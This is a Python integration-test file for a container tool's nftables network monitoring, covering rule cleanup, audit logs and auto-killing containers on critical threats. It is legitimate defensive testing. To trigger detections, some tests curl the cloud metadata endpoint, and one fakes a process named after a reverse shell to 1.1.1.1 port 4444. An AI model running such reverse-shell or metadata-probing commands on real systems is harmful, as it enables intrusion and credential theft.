#!/usr/bin/env python3
"""
Integration tests for nftables-based network monitoring.

Tests NFT monitoring daemon lifecycle, rule management, threat detection,
and integration with the monitoring system.

These tests verify the critical security functionality:
1. NFT rules are created/destroyed correctly
2. Suspicious network activity is detected
3. Containers are KILLED on CRITICAL threats

NOTE: These tests require systemd journal access and nftables.
"""

import hashlib
import json
import os
import re
import subprocess
import time
from pathlib import Path

import pytest

from support.monitoring import coi_session_logs


def get_container_name_from_workspace(workspace, slot=1):
    """Generate expected container name from workspace path."""
    abs_path = os.path.abspath(workspace)
    hash_digest = hashlib.sha256(abs_path.encode()).hexdigest()[:8]
    return f"coi-{hash_digest}-{slot}"


def get_container_ip(container_name):
    """Get container IP address from eth0."""
    result = subprocess.run(
        ["incus", "list", container_name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=30,
    )
    if result.returncode != 0:
        return None
    container_info = json.loads(result.stdout)
    if not container_info:
        return None

    for iface_name, iface_info in container_info[0].get("state", {}).get("network", {}).items():
        if iface_name == "eth0":
            for addr in iface_info.get("addresses", []):
                if addr["family"] == "inet":
                    return addr["address"]
    return None


def wait_for_container_ip(container_name, timeout=30):
    """Wait for the container's eth0 IPv4 address (DHCP can lag behind Running)."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        ip = get_container_ip(container_name)
        if ip:
            return ip
        time.sleep(1)
    return None


def get_container_state(name):
    """Get container state."""
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"
    containers = json.loads(result.stdout)
    # `incus list <name>` matches by prefix; pick the exact name.
    match = [c for c in containers if c.get("name") == name]
    return match[0].get("status", "Unknown") if match else "Unknown"


def get_nft_threat_events(container_name):
    """Get threat events from NFT audit log."""
    log_path = Path.home() / ".coi" / "audit" / f"{container_name}-nft.jsonl"
    if not log_path.exists():
        return []

    events = []
    with open(log_path) as f:
        for line in f:
            if line.strip():
                try:
                    event = json.loads(line)
                    if "level" in event:
                        events.append(event)
                except json.JSONDecodeError:
                    pass
    return events


def cleanup_container(name, coi_binary, env=None):
    """Force cleanup container."""
    subprocess.run(
        [coi_binary, "container", "delete", name, "--force"],
        timeout=60,
        capture_output=True,
        check=False,
        env=env,
    )


def wait_for_container_ready(container_name, timeout=30):
    """Wait for container to be running."""
    start = time.time()
    while time.time() - start < timeout:
        state = get_container_state(container_name)
        if state == "Running":
            return True
        time.sleep(1)
    return False


def check_nft_rules_exist(container_ip):
    """Check if NFT rules exist for container."""
    result = subprocess.run(
        ["sudo", "-n", "nft", "list", "ruleset"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return False
    return (
        f"NFT_COI[{container_ip}]" in result.stdout
        or f"NFT_DNS[{container_ip}]" in result.stdout
        or f"NFT_SUSPICIOUS[{container_ip}]" in result.stdout
    )


_MONITOR_RULE_RE = re.compile(r"NFT_(?:COI|DNS|SUSPICIOUS)\[[0-9.]+\]")


def _leftover_monitor_rules():
    """NFT_COI/NFT_DNS/NFT_SUSPICIOUS LOG rule lines (with handles) in ip filter FORWARD."""
    r = subprocess.run(
        ["sudo", "-n", "nft", "-a", "list", "chain", "ip", "filter", "FORWARD"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if r.returncode != 0:
        return []
    return [ln.strip() for ln in r.stdout.splitlines() if _MONITOR_RULE_RE.search(ln)]


def _leak_diagnostics(lines):
    """Everything that could explain who owns (or should have removed) the rules."""

    def run(cmd):
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return (r.stdout + r.stderr).strip()

    parts = ["leftover rules:", *lines]
    parts += [
        "",
        "coi supervise processes:",
        run(["pgrep", "-af", "supervise --state"]) or "(none)",
    ]
    parts += ["", "containers:", run(["incus", "list", "--format=csv", "-c", "ns4"]) or "(none)"]
    run_dir = Path.home() / ".coi" / "run"
    states = sorted(run_dir.glob("*.supervisor.json")) if run_dir.exists() else []
    parts += ["", "supervisor state files:", *(p.name for p in states)]
    for p in states:
        parts.append(coi_session_logs(p.name.removesuffix(".supervisor.json"), tail=3000))
    return "\n".join(parts)


@pytest.fixture(autouse=True)
def no_leaked_monitor_rules():
    """Fail the test that leaves NFT monitoring LOG rules behind, and remove them.

    Every test here deletes its container in `finally`, after which the session
    supervisor must remove that container's NFT_* rules. The rules are keyed by IP
    only and CI hands every container the same IP, so a leak silently satisfies the
    next test's "rules exist" checks and then breaks its "rules removed" check
    (the test_rules_removed_on_session_end flake). Attribute the leak to the test
    that caused it, with diagnostics, and clean up so it cannot cascade.
    """
    yield
    deadline = time.time() + 20  # supervisor poll (2 s) + teardown, with CI slack
    lines = _leftover_monitor_rules()
    while lines and time.time() < deadline:
        time.sleep(1)
        lines = _leftover_monitor_rules()
    if not lines:
        return
    diagnostics = _leak_diagnostics(lines)
    for ln in lines:
        handle = ln.rsplit("# handle ", 1)[-1].split()[0] if "# handle " in ln else ""
        if handle.isdigit():
            subprocess.run(
                [
                    "sudo",
                    "-n",
                    "nft",
                    "delete",
                    "rule",
                    "ip",
                    "filter",
                    "FORWARD",
                    "handle",
                    handle,
                ],
                capture_output=True,
                timeout=10,
            )
    pytest.fail(
        "NFT monitoring rules leaked: still present 20s after the test's container was "
        f"deleted (removed them now).\n{diagnostics}"
    )


@pytest.fixture(scope="module")
def nft_monitoring_available():
    """Check if NFT monitoring is available before running tests."""
    # Check if nft command works (requires sudo)
    try:
        result = subprocess.run(
            ["sudo", "-n", "nft", "list", "ruleset"],
            capture_output=True,
            timeout=10,
        )
        if result.returncode != 0:
            pytest.skip("NFT not available: nft command failed (check sudo permissions)")
    except subprocess.TimeoutExpired:
        pytest.skip("NFT not available: nft command timed out")
    except FileNotFoundError:
        pytest.skip("NFT not available: nft command not found")

    # Check if journalctl is accessible
    try:
        result = subprocess.run(
            ["journalctl", "-n", "1", "-k"],
            capture_output=True,
            timeout=5,
        )
        if result.returncode != 0:
            pytest.skip("NFT monitoring not available: journal access failed")
    except subprocess.TimeoutExpired:
        pytest.skip("NFT monitoring not available: journal access timed out")
    except FileNotFoundError:
        pytest.skip("NFT monitoring not available: journalctl not found")

    return True


@pytest.fixture
def test_workspace(tmp_path):
    """Create a temporary workspace for tests with monitoring config."""
    workspace = tmp_path / "nft-test-workspace"
    workspace.mkdir()

    # Create config that enables monitoring (replaces --monitor flag)
    config_dir = workspace / ".coi"
    config_dir.mkdir(exist_ok=True)
    (config_dir / "config.toml").write_text("""
[monitoring]
enabled = true
auto_kill_on_critical = true
auto_pause_on_high = true

[monitoring.nft]
enabled = true
""")

    return str(workspace)


@pytest.fixture
def coi_monitoring_env(test_workspace):
    """Return environment dict with COI_CONFIG pointing to workspace config."""
    config_path = os.path.join(test_workspace, ".coi", "config.toml")
    env = os.environ.copy()
    env["COI_CONFIG"] = config_path
    return env


class TestNFTRuleManagement:
    """Test nftables rule creation and deletion."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_rules_created_on_session_start(self, test_workspace, coi_binary, coi_monitoring_env):
        """Verify nftables LOG rules are created when session starts."""
        slot = 50
        container_name = get_container_name_from_workspace(test_workspace, slot)

        # Start session with monitoring using Popen (non-blocking)
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            # Wait for container to be ready
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Poll for NFT rules (may take a moment after container is running)
            nft_ready = False
            for _ in range(15):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(1)

            assert nft_ready, f"NFT monitoring rules not found for IP {container_ip}"
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)

    def test_rules_removed_on_session_end(self, test_workspace, coi_binary, coi_monitoring_env):
        """nftables rules outlive the coi shell command and are removed when the
        session's container stops."""
        slot = 51
        container_name = get_container_name_from_workspace(test_workspace, slot)

        # Start session
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Wait for NFT rules to be created (monitoring daemon may take time to set up)
            nft_ready = False
            for _ in range(15):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(2)
            assert nft_ready, "Rules should exist while monitoring"

            # End the coi shell command. The container keeps running, and so
            # does its monitoring (the session supervisor owns it), so the
            # rules must stay.
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            time.sleep(5)
            assert check_nft_rules_exist(container_ip), (
                "monitoring rules disappeared while the container was still running"
            )

            # Stopping the container ends the session: the supervisor removes
            # the rules.
            subprocess.run(
                ["incus", "stop", "--force", container_name],
                capture_output=True,
                timeout=60,
            )
            gone = False
            for _ in range(30):
                if not check_nft_rules_exist(container_ip):
                    gone = True
                    break
                time.sleep(1)
            assert gone, f"NFT rules for {container_ip} not cleaned up after the container stopped"

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)

    def test_multiple_rule_types(self, test_workspace, coi_binary, coi_monitoring_env):
        """Verify core rule types are created (general, suspicious)."""
        slot = 52
        container_name = get_container_name_from_workspace(test_workspace, slot)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Wait until BOTH NFT_COI and NFT_SUSPICIOUS rules are present in the
            # same ruleset snapshot. Using a single snapshot eliminates the race where
            # check_nft_rules_exist() returns True on the first rule to appear (OR
            # condition), we break, then the second nft list call sees only one rule.
            ruleset = ""
            nft_ready = False
            for _ in range(20):
                result = subprocess.run(
                    ["sudo", "-n", "nft", "list", "ruleset"],
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                if result.returncode == 0:
                    ruleset = result.stdout
                    if (
                        f"NFT_COI[{container_ip}]" in ruleset
                        and f"NFT_SUSPICIOUS[{container_ip}]" in ruleset
                    ):
                        nft_ready = True
                        break
                time.sleep(1)

            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"

            # Should have general and suspicious rules (DNS is optional config)
            assert f"NFT_COI[{container_ip}]" in ruleset, "General traffic rule not found"
            assert f"NFT_SUSPICIOUS[{container_ip}]" in ruleset, "Suspicious traffic rule not found"
            # NFT_DNS is optional (depends on log_dns_queries config)

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)


class TestNetworkThreatDetection:
    """Test network threat detection scenarios."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_metadata_endpoint_triggers_critical(
        self, test_workspace, coi_binary, coi_monitoring_env
    ):
        """Test that metadata endpoint access triggers CRITICAL alert."""
        slot = 53
        container_name = get_container_name_from_workspace(test_workspace, slot)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Wait for NFT rules to be created (confirms monitoring pipeline is active)
            nft_ready = False
            for _ in range(15):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(1)

            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"

            # Attempt to access metadata endpoint from inside container
            subprocess.run(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "curl",
                    "-m",
                    "3",
                    "http://169.254.169.254/latest/meta-data/",
                ],
                capture_output=True,
                timeout=10,
            )

            # Poll for CRITICAL threat events (monitoring pipeline is async:
            # journal reader -> event processor -> responder -> audit log write)
            events = []
            critical_events = []
            for _ in range(30):
                time.sleep(1)
                events = get_nft_threat_events(container_name)
                critical_events = [e for e in events if e.get("level") == "critical"]
                if len(critical_events) > 0:
                    break

            # Should have detected metadata access specifically as critical
            assert len(critical_events) > 0, (
                f"Expected CRITICAL threat logged for metadata access. Events: {events}"
            )

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)

    def test_container_killed_on_metadata_access(
        self, test_workspace, coi_binary, coi_monitoring_env
    ):
        """Verify container is killed when accessing cloud metadata endpoint."""
        slot = 54
        container_name = get_container_name_from_workspace(test_workspace, slot)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Wait for NFT rules to be created (confirms monitoring pipeline is active)
            nft_ready = False
            for _ in range(15):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(1)

            assert nft_ready, f"NFT monitoring rules never appeared for {container_ip}"

            # Access metadata endpoint (should trigger kill)
            subprocess.run(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "curl",
                    "-m",
                    "3",
                    "http://169.254.169.254/",
                ],
                capture_output=True,
                timeout=10,
            )

            # Wait for kill action with retry loop
            killed = False
            for _ in range(30):
                time.sleep(1)
                state = get_container_state(container_name)
                if state in ("Stopped", "Unknown"):
                    killed = True
                    break

            assert killed, f"Container should have been killed but state is {state}"

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)

    def test_network_activity_counted(self, test_workspace, coi_binary, coi_monitoring_env):
        """Test that network activity hits NFT rules (verified via counters)."""
        slot = 55
        container_name = get_container_name_from_workspace(test_workspace, slot)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Generate traffic and poll the NFT_COI counter. The counter rule is
            # in place from session start, but traffic generation + counting is
            # timing-sensitive on loaded CI runners, so retry a few times rather
            # than relying on a single request landing within one sleep window.
            # Rule format: ... log prefix "NFT_COI[IP]: " ... counter packets N bytes M
            import re

            pattern = rf"NFT_COI\[{re.escape(container_ip)}\].*counter packets (\d+)"
            match = None
            packets = 0
            for _ in range(6):
                subprocess.run(
                    [
                        "incus",
                        "exec",
                        container_name,
                        "--",
                        "curl",
                        "-m",
                        "5",
                        "-s",
                        "-o",
                        "/dev/null",
                        "https://example.com",
                    ],
                    capture_output=True,
                    timeout=30,
                )
                time.sleep(2)
                result = subprocess.run(
                    ["sudo", "-n", "nft", "list", "ruleset"],
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                match = re.search(pattern, result.stdout)
                if match and int(match.group(1)) > 0:
                    packets = int(match.group(1))
                    break

            assert match, f"NFT_COI rule not found for {container_ip}"
            assert packets > 0, f"No packets counted for {container_ip}"

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)


class TestAuditLogging:
    """Test NFT audit logging functionality."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_audit_log_created(self, test_workspace, coi_binary, coi_monitoring_env):
        """Test that audit log file is created when monitoring starts."""
        slot = 56
        container_name = get_container_name_from_workspace(test_workspace, slot)

        stderr_file = Path("/tmp") / f"nft-audit-test-{slot}.log"
        with open(stderr_file, "w") as stderr_fd:
            proc = subprocess.Popen(
                [
                    coi_binary,
                    "shell",
                    "--workspace",
                    test_workspace,
                    "--slot",
                    str(slot),
                ],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=stderr_fd,
                env=coi_monitoring_env,
            )

            try:
                if not wait_for_container_ready(container_name, timeout=60):
                    pytest.fail(f"Container {container_name} did not start")

                # Wait for the NFT monitoring daemon to actually start before
                # triggering traffic. Without this, the curl may fire before the
                # daemon is ready to observe it and write audit logs.
                # The session supervisor runs the daemon and writes to the session
                # log; coi shell's stderr covers the in-process fallback.
                daemon_started = False
                output = ""
                for _ in range(30):
                    time.sleep(1)
                    output = stderr_file.read_text() + coi_session_logs(container_name)
                    if "[security] NFT network monitoring started" in output:
                        daemon_started = True
                        break

                if not daemon_started:
                    pytest.fail(
                        "NFT monitoring daemon did not start in time. "
                        f"coi shell stderr and session logs:\n{output}"
                    )

                # Trigger some network activity
                subprocess.run(
                    [
                        "incus",
                        "exec",
                        container_name,
                        "--",
                        "curl",
                        "-m",
                        "5",
                        "https://example.com",
                    ],
                    capture_output=True,
                    timeout=30,
                )

                # Poll for the audit directory to appear (the daemon writes
                # asynchronously so a fixed sleep is unreliable on slow CI).
                audit_dir = Path.home() / ".coi" / "audit"
                for _ in range(15):
                    if audit_dir.exists():
                        break
                    time.sleep(1)

                assert audit_dir.exists(), (
                    f"Audit directory {audit_dir} not found after 15s. "
                    f"stderr:\n{stderr_file.read_text()}"
                )

            finally:
                proc.terminate()
                try:
                    proc.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    proc.kill()
                cleanup_container(container_name, coi_binary, env=coi_monitoring_env)


class TestDaemonLifecycle:
    """Test NFT monitoring daemon lifecycle."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_daemon_starts_with_monitoring_config(
        self, test_workspace, coi_binary, coi_monitoring_env
    ):
        """Test that daemon starts when monitoring is enabled via config."""
        slot = 57
        container_name = get_container_name_from_workspace(test_workspace, slot)

        # Capture stderr to check for startup message
        stderr_file = Path("/tmp") / f"nft-test-{slot}.log"
        with open(stderr_file, "w") as stderr_fd:
            proc = subprocess.Popen(
                [
                    coi_binary,
                    "shell",
                    "--workspace",
                    test_workspace,
                    "--slot",
                    str(slot),
                ],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=stderr_fd,
                env=coi_monitoring_env,
            )

            try:
                # Poll for the startup message instead of a fixed sleep. The
                # window is generous (CI runners are frequently overloaded and the
                # daemon starts after full session setup). The session supervisor
                # runs the monitor and writes to the session log, so look there as
                # well as at coi shell's own stderr (its in-process fallback).
                output = ""
                started = False
                for _ in range(90):
                    time.sleep(1)
                    output = stderr_file.read_text() + coi_session_logs(container_name)
                    if "[security] NFT network monitoring started" in output:
                        started = True
                        break

                assert started, (
                    f"NFT daemon startup message not found in coi shell stderr or the "
                    f"session logs:\n{output}"
                )

                # The user's terminal (coi shell's stderr) must still confirm that
                # monitoring is running: the supervisor's notice, or the monitors'
                # own lines when coi shell fell back to running them in-process.
                terminal = stderr_file.read_text()
                assert (
                    "[supervisor] Running security monitoring" in terminal
                    or "[security] NFT network monitoring started" in terminal
                ), f"no monitoring confirmation on the terminal:\n{terminal}"

            finally:
                proc.terminate()
                try:
                    proc.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    proc.kill()
                cleanup_container(container_name, coi_binary, env=coi_monitoring_env)
                stderr_file.unlink(missing_ok=True)


class TestNFTRuleCleanupOnKill:
    """Test NFT rule cleanup when containers are killed."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_nft_rules_cleaned_on_coi_kill(self, test_workspace, coi_binary, coi_monitoring_env):
        """Verify NFT rules are removed when container is killed via coi kill."""
        slot = 60
        container_name = get_container_name_from_workspace(test_workspace, slot)

        # Start session with monitoring
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Poll for NFT rules (may take a moment after container is running)
            nft_ready = False
            for _ in range(15):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(1)

            assert nft_ready, f"NFT rules should exist for {container_ip} before kill"

            # Kill using coi kill command
            kill_result = subprocess.run(
                [coi_binary, "kill", container_name, "--force"],
                capture_output=True,
                text=True,
                timeout=60,
                env=coi_monitoring_env,
            )
            assert kill_result.returncode == 0, f"coi kill failed: {kill_result.stderr}"

            # Give cleanup time to complete
            time.sleep(2)

            # Verify NFT rules are cleaned up
            assert not check_nft_rules_exist(container_ip), (
                f"NFT rules should be cleaned up for {container_ip} after coi kill"
            )

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)

    def test_nft_rules_cleaned_on_auto_kill(self, test_workspace, coi_binary, coi_monitoring_env):
        """Verify NFT rules are removed when container is auto-killed by responder."""
        slot = 61
        container_name = get_container_name_from_workspace(test_workspace, slot)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Poll for NFT rules (may take a moment after container is running)
            nft_ready = False
            for _ in range(15):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(1)

            assert nft_ready, f"NFT rules should exist for {container_ip} before auto-kill"

            # Trigger auto-kill by accessing metadata endpoint (CRITICAL threat)
            subprocess.run(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "curl",
                    "-m",
                    "3",
                    "http://169.254.169.254/",
                ],
                capture_output=True,
                timeout=10,
            )

            # Wait for responder to detect threat and kill container
            killed = False
            for _ in range(15):
                time.sleep(1)
                state = get_container_state(container_name)
                if state in ("Stopped", "Unknown"):
                    killed = True
                    break

            assert killed, f"Container should have been killed but state is {state}"

            # Verify NFT rules are cleaned up (may take a moment after kill)
            cleaned = False
            for _ in range(15):
                if not check_nft_rules_exist(container_ip):
                    cleaned = True
                    break
                time.sleep(1)

            assert cleaned, f"NFT rules should be cleaned up for {container_ip} after auto-kill"

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)


class TestNFTRuleCleanupOnShutdown:
    """Test NFT rule cleanup when containers are shutdown."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_nft_rules_cleaned_on_coi_shutdown(
        self, test_workspace, coi_binary, coi_monitoring_env
    ):
        """Verify NFT rules are removed when container is shutdown via coi shutdown."""
        slot = 62
        container_name = get_container_name_from_workspace(test_workspace, slot)

        # Start session with monitoring
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Wait for NFT rules to be created (monitoring daemon may take time to set up)
            nft_ready = False
            for _ in range(15):
                if check_nft_rules_exist(container_ip):
                    nft_ready = True
                    break
                time.sleep(2)
            assert nft_ready, f"NFT rules should exist for {container_ip} before shutdown"

            # Terminate the shell process first to avoid a race where both
            # the shell's cleanup handler and coi shutdown try to delete the
            # container simultaneously.
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)
            time.sleep(2)

            # Shutdown using coi shutdown command
            shutdown_result = subprocess.run(
                [coi_binary, "shutdown", container_name, "--force"],
                capture_output=True,
                text=True,
                timeout=60,
                env=coi_monitoring_env,
            )
            assert shutdown_result.returncode == 0, f"coi shutdown failed: {shutdown_result.stderr}"

            # Give cleanup time to complete
            time.sleep(2)

            # Verify NFT rules are cleaned up
            assert not check_nft_rules_exist(container_ip), (
                f"NFT rules should be cleaned up for {container_ip} after coi shutdown"
            )

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            cleanup_container(container_name, coi_binary, env=coi_monitoring_env)


def check_nft_coi_rules_exist(container_ip):
    """Check if nft rules in the ip coi forward chain exist for container IP."""
    result = subprocess.run(
        ["sudo", "-n", "nft", "-a", "list", "chain", "ip", "coi", "forward"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return False
    # Match the exact rule key (comment "coi-<IP>") rather than a bare substring:
    # a substring match false-positives on a superstring IP (e.g. killed
    # 10.x.x.5 matching a live 10.x.x.50) or a stale coi-<IP> from a recycled
    # DHCP lease. The trailing quote anchors the IP. Rules are keyed this way in
    # internal/network/nft_filter.go (fmt.Sprintf(`"coi-%s"`, containerIP)).
    return f'comment "coi-{container_ip}"' in result.stdout


class TestNFTCOIRuleCleanupOnAutoKill:
    """Test nft coi forward rule cleanup when containers are auto-killed by responder."""

    @pytest.fixture(autouse=True)
    def check_nft_available(self, nft_monitoring_available):
        """Ensure NFT monitoring is available before running tests."""
        pass

    def test_nft_coi_rules_cleaned_on_auto_kill(
        self, test_workspace, coi_binary, coi_monitoring_env
    ):
        """Verify nft rules in ip coi forward are removed when container is auto-killed."""
        slot = 63
        container_name = get_container_name_from_workspace(test_workspace, slot)

        # Add restricted network to config (needed for nft coi forward rules)
        import pathlib

        config_path = pathlib.Path(test_workspace) / ".coi" / "config.toml"
        config_text = config_path.read_text()
        if "[network]" not in config_text:
            config_path.write_text(config_text + '\n[network]\nmode = "restricted"\n')

        # Start session with monitoring (via config) AND restricted network
        # (to have nft coi forward rules)
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=coi_monitoring_env,
        )

        try:
            if not wait_for_container_ready(container_name, timeout=60):
                pytest.fail(f"Container {container_name} did not start")

            container_ip = wait_for_container_ip(container_name)
            assert container_ip, f"Container {container_name} got no IP address"

            # Verify nft rules exist before triggering kill
            # (restricted mode creates rules in ip coi forward)
            deadline = time.time() + 15
            while not check_nft_coi_rules_exist(container_ip) and time.time() < deadline:
                time.sleep(1)
            assert check_nft_coi_rules_exist(container_ip), (
                f"No nft coi forward rules created for {container_ip}"
            )

            # Trigger the auto-kill with a reverse-shell process (CRITICAL).
            # Not a metadata-endpoint access: restricted mode's firewall blocks
            # 169.254.169.254, and on CI that blocked attempt was never detected
            # (the container kept running), so it can't drive this test.
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "bash",
                    "-c",
                    "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Wait for responder to detect threat and kill container
            killed = False
            for _ in range(40):
                time.sleep(1)
                state = get_container_state(container_name)
                if state in ("Stopped", "Unknown"):
                    killed = True
                    break

            assert killed, f"Container should have been killed but state is {state}"

            # Verify nft coi forward rules are cleaned up. On auto-kill the
            # responder removes the per-IP rules in its kill path, and the coi
            # shell process's session.Cleanup runs Teardown as an idempotent
